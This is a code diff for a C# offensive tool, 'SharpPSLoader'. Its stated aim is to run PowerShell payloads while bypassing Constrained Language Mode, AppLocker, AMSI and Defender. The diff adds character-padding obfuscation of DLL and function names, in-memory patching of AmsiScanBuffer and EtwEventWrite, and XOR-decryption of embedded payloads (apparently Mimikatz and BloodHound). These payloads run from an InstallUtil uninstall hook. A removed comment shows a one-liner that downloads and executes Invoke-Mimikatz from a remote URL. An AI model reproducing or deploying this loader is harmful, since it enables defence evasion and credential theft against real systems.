@@ -20,6 +20,14 @@ using System.Reflection;
  * 
  * C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U <test.exe>
  * 
+ *  * Goal: 
+ *  - Create a powershell loader from .NET which can bypass CLM, Applocker, AMSI, and Defender 
+ *      - CLM = Through custom powershell runspace (powerpick technique)
+ *      - Applocker = Through lolbas such as InstallUtil and rundll32
+ *      - AMSI = Through .NET (.net amsi is a thing though) 
+ *      - Defender = Bypassing defender ain't that hard 
+ *      
+ *      
  * Adding Resources 
  *  - Project > Properties > Add Resources > Access Modifier = Public 
  *  - And simply access it like... var thingy = Properties.Resources.<resource-name>
@@ -46,11 +54,29 @@ using System.Reflection;
 
 namespace SharpPSLoader
 {
+    // helper function 
+/*    public static bool ContainsAny(this string haystack, params string[] needles)
+    {
+        foreach (string needle in needles)
+        {
+            if (haystack.Contains(needle))
+                return true;
+        }
+
+        return false;
+    }*/
+
     public class SharpPSLoader
     {
+
         public Dictionary<string, byte[]> resourceDict = ParseResources();
 
-        // Decrypting with single byte, hardcoding "0x6f = (111)" as default key, for now. 
+        /// <summary>
+        /// XOR Decrypt powershell byte array payload with key and return raw powershell payload 
+        /// </summary>
+        /// <param name="payload"></param>
+        /// <param name="singleByteKey"></param>
+        /// <returns>resultStr, powershell string</returns>
         public static string DecryptAndStringReturn(byte[] payload, byte singleByteKey = 0x6f)
         {
             byte[] result = new byte[payload.Length];
@@ -66,6 +92,10 @@ namespace SharpPSLoader
 
         // Return a dictionary of <string,byte[]>
         // https://stackoverflow.com/questions/1310812/how-can-i-find-all-the-members-of-a-properties-resources-in-c-sharp
+        /// <summary>
+        /// Parse resources from assembly and create a dictionary of <string, byte[]> where string = Name, byte[] = Encrypted powershell payload.
+        /// </summary>
+        /// <returns>resourceDict</returns>
         public static Dictionary<string, byte[]> ParseResources()
         {
             Dictionary<string, byte[]> resourceDict = new Dictionary<string, byte[]>();
@@ -75,7 +105,6 @@ namespace SharpPSLoader
             foreach (PropertyInfo property in (typeof(Properties.Resources).GetProperties
                 (BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic)).Skip(2))  // Skip ResourceManager and Culture - hardcoding ftw 
             {
-                Console.WriteLine("{0}: {1}", property.Name, property.GetValue(null, null));
                 resourceDict[property.Name] = (byte[])(property.GetValue(null, null));
             }
             return resourceDict;
@@ -83,17 +112,27 @@ namespace SharpPSLoader
 
         // public byte[] ByteArrayFromRsrcDict(dictionary<string,byte[]> resourceDict) { ~switch, return byte[] } 
         // make resourceDict into a member variable? not sure. 
+        /// <summary>
+        /// Decrypt powershell payload from the resources dictioanry and return the raw powershell payload 
+        /// </summary>
+        /// <param name="resourceDict"></param>
+        /// <param name="payload"></param>
+        /// <returns>decPowershell</returns>
         public string DecryptedPSFromRsrcDict(Dictionary<string,byte[]> resourceDict, string payload)
         {
             // 1. Return encrypted powershell payload byte array 
             byte[] encPayload = Array.Empty<byte>();
-            switch (payload)
+
+#if DEBUG
+            Console.WriteLine("[+] payload = {0}", payload);
+#endif
+            switch (payload.Trim())
             {
                 case "1":
                     encPayload = resourceDict.Where(a => a.Key.Contains("mika")).Select(a => a.Value).First();
                     break;
                 case "2":
-                    encPayload = resourceDict.Where(a => a.Key.Contains("oodho")).Select(a => a.Value).First();
+                    encPayload = resourceDict.Where(a => a.Key.Contains("oodHo")).Select(a => a.Value).First();
                     break;
                 default:
                     break;
@@ -114,7 +153,7 @@ namespace SharpPSLoader
                 //Console.WriteLine(line);
                 if (line.ToLower().Contains("function"))
                 {
-                    functionName = line.Split(' ')[1];
+                    functionName = line.Split(' ')[1].Trim().Replace("{","");
                     break;
                 }
             }
@@ -198,12 +237,16 @@ namespace SharpPSLoader
             }
         }
 
+
+        // TODO: Create helper function that does basic string replace? 
         public void bypassTW()
         {
-            string ntdll = "ntdll.dll";
-            string magicFunction = "EtwEventWrite";
+            string susLibraryZ = "nZtZdZlZlZ.dZlZlZ";
+            string magicFunctionZ = "EZZtZwZEZvZeZnZtZWZrZiZtZe";
+            string susLibrary = susLibraryZ.Replace("Z", "");
+            string magicFunction = magicFunctionZ.Replace("Z", "");
 
-            IntPtr ntdllAddr = LoadLibrary(ntdll);
+            IntPtr ntdllAddr = LoadLibrary(susLibrary);
             IntPtr etwWriteEventAddr = GetProcAddress(ntdllAddr, magicFunction);
 
             byte[] magicVoodoo = GetPatchBytes("bypasstw");
@@ -213,15 +256,20 @@ namespace SharpPSLoader
             Marshal.Copy(magicVoodoo, 0, etwWriteEventAddr, magicVoodoo.Length);
             VirtualProtect(etwWriteEventAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);
 
+#if DEBUG
             Console.WriteLine("[+] Disabled ETW Tracing");
+#endif
         }
 
         public void bypassSI()
         {
-            string amsidll = "a" + "msi" + ".d" + "ll";
-            string amsiScanBuffer = "Am" + "siSc" + "anB" + "uffer";
+            string amsidllZ = "Za" + "mZsZi" + "Z.ZdZ" + "Zll";
+            string amsiScanBufferZ = "AZm" + "siSZZc" + "aZnZB" + "uZfZfZer";
 
-            IntPtr amsidllAddr = LoadLibrary(amsidll);
+            string amsiDll = amsidllZ.Replace("Z", "");
+            string amsiScanBuffer = amsiScanBufferZ.Replace("Z", "");
+
+            IntPtr amsidllAddr = LoadLibrary(amsiDll);
             IntPtr amsiScanBufferAddr = GetProcAddress(amsidllAddr, amsiScanBuffer);
 
             byte[] magicVoodoo = GetPatchBytes("bypasssi");
@@ -230,30 +278,43 @@ namespace SharpPSLoader
             Marshal.Copy(magicVoodoo, 0, amsiScanBufferAddr, magicVoodoo.Length);
             VirtualProtect(amsiScanBufferAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);
 
+#if DEBUG
             Console.WriteLine("[+] Disabled AMSI");
+#endif
         }
 
         public void RunPowershell(string payload, string argument = "")
         {
-            // Powershell payload goes here. Might be replaced with taking powershell from resources. 
-            // Use dnlib for resources section? Or just xor powershell + base64 as a static variable here? not sure. 
-            //String cmd = @"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -command 'coffee'";
-
+            argument = argument.TrimStart();
+#if DEBUG
+            Console.WriteLine("[+] User argument = {0}", argument);
+#endif
             string cmd = payload;
 
             // Parse for "function" and retrieve the function name here and add to cmd 
             // Why parse functionName? Because simply typing "Invoke-Mimikatz -DumpCred" will trigger amsi. 
-            var functionName = ParseFunctionName(cmd);
+            string functionName = ParseFunctionName(cmd);
 
-            // If argument, add functionName and argument 
-            if (!string.IsNullOrEmpty(argument))
+            // If script has a single invoke-<XYZ> functionName, add that at the end of the script 
+            var requireFunctionName = new[] { "mikat", "loodhou" };
+            bool boolFunctionName = requireFunctionName.Any(s => functionName.ToLower().Contains(s));
+
+            if (!string.IsNullOrEmpty(argument) && boolFunctionName)
             {
+                Console.WriteLine(functionName);
                 cmd += ";";
                 cmd += functionName;
                 cmd += " ";
                 cmd += argument;
             }
-            
+            else
+            {
+                cmd += "; ";
+                cmd += argument;
+            }
+
+            //Console.WriteLine(cmd);
+           
 
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
@@ -270,7 +331,7 @@ namespace SharpPSLoader
                 return;
             }
 
-            // Result is not 0, at least something returned. 
+            // Result is not 0, at least something returned. Write all output and yeet out. 
             foreach(var obj in results)
             {
                 if (obj != null)
@@ -293,7 +354,7 @@ namespace SharpPSLoader
         {
             Console.WriteLine("[+] Starting from main! ");
 
-            SharpPSLoader psLoader = new SharpPSLoader();
+/*            SharpPSLoader psLoader = new SharpPSLoader();
             psLoader.bypassSI();
             psLoader.bypassTW();
             //Console.ReadLine();
@@ -307,7 +368,9 @@ namespace SharpPSLoader
             
 
             psLoader.RunPowershell(powershellPayload, args[1]);
-            Console.ReadLine();
+
+            // Remove me later! 
+            Console.ReadLine();*/
         }
 
 
@@ -336,7 +399,6 @@ namespace SharpPSLoader
      * 2. Retrieve payload from the resources section 
      * 3. Single XOR decrypt using "111" hardcoded key 
      * 4. Invoke it
-     * 
      * */
     [System.ComponentModel.RunInstaller(true)]
     public class Sample: System.Configuration.Install.Installer
@@ -344,16 +406,36 @@ namespace SharpPSLoader
         SharpPSLoader psLoader = new SharpPSLoader();
 
 
+        // Mimikatz doesn't work, but bloodhound does...? 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="savedState"></param>
         public override void Uninstall(IDictionary savedState)
         {
+            Console.WriteLine("hello, world!");
             //var psPayload = this.Context.Parameters["p"];
             //Console.WriteLine(psPayload.ToString());
+            SharpPSLoader psLoader = new SharpPSLoader();
 
+            // Are these two needed, when I'm executing through cmd + lolbas? 
             psLoader.bypassSI();
             psLoader.bypassTW();
-            //psLoader.RunPowershell();
 
-            
+            // Parse argument 
+            var userArg = this.Context.Parameters["p"];
+            string payload = userArg.Split(' ')[0];
+            int spaceIndex = userArg.IndexOf(' ');
+            string argument = userArg.Substring(spaceIndex, userArg.Length - 1);
+
+            string powershellPayload = "";
+            if (payload != null)
+            {
+                powershellPayload = psLoader.DecryptedPSFromRsrcDict(psLoader.resourceDict, payload);
+            }
+
+            psLoader.RunPowershell(powershellPayload, argument);
+
         }
     }
 
